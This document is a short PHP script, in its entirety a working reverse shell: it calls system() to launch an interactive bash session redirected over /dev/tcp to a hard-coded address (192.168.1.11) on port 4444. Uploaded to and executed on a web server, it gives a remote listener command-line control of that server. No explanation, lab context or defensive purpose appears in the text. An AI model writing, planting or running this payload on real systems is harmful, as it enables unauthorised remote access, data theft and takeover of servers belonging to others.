<?php
$ip = '192.168.1.11';
$port = 4444;
system("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>

